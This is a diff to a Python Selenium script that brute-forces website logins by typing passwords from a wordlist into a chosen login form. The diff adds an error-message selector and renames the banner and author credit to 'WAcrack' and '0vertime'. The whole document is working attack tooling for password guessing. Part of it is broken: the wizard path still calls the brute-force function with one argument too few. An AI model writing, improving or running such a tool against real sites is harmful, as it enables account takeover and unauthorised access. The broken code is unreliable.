@@ -37,6 +37,7 @@ parser.add_option("-u", "--username", dest="username",help="Choose the username"
 parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
 parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
+parser.add_option("--errorsel", dest="errorsel",help= "Choose the error message selector")
 parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
@@ -67,14 +68,15 @@ def wizard():
         print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
         exit()
 
-    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
-    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
+    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Username selector: ')
+    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Password selector: ')
     login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
+    error_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Error message selector: ')
     username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
     pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
-def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
+def brutes(username, username_selector ,password_selector,login_btn_selector,error_selector,pass_list, website):
     f = open(pass_list, 'r')
     driver = webdriver.Chrome()
     optionss = webdriver.ChromeOptions()
@@ -94,6 +96,8 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 # browser.find_element_by_css_selector(username_selector).clear()
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
+                t.sleep(1)
+                error = browser.find_element_by_css_selector(error_selector) #Finds Selector
                 print '------------------------'
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print '------------------------'
@@ -109,15 +113,15 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
 
 
 banner = color.BOLD + color.RED +'''
-  _    _       _       _
- | |  | |     | |     | |
- | |__| | __ _| |_ ___| |__ 
- |  __  |/ _` | __/ __| '_ \\
- | |  | | (_| | || (__| | | |
- |_|  |_|\__,_|\__\___|_| |_|
+ __          __                        _
+ \ \        / /\                      | |
+  \ \  /\  / /  \   ___ _ __ __ _  ___| | __
+   \ \/  \/ / /\ \ / __| '__/ _` |/ __| |/ /
+    \  /\  / ____ \ (__| | | (_| | (__|   <
+     \/  \/_/    \_\___|_|  \__,_|\___|_|\_\
   {0}[{1}-{2}]--> {3}V.1.0
-  {4}[{5}-{6}]--> {7}coded by Metachar
-  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
+  {4}[{5}-{6}]--> {7}coded by 0vertime
+  {8}[{9}-{10}]-->{11}brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
 driver = webdriver.Chrome()
 optionss = webdriver.ChromeOptions()
@@ -129,6 +133,7 @@ if options.username == None:
     if options.usernamesel == None:
         if options.passsel == None:
             if options.loginsel == None:
+             if options.errorsel == None:
                 if options.passlist == None:
                     if options.website == None:
                         wizard()
@@ -138,10 +143,8 @@ username = options.username
 username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
+error_selector = options.errorsel
 website = options.website
 pass_list = options.passlist
 print banner
-brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
-
-
-
+brutes(username, username_selector ,password_selector,login_btn_selector,error_selector,pass_list, website)
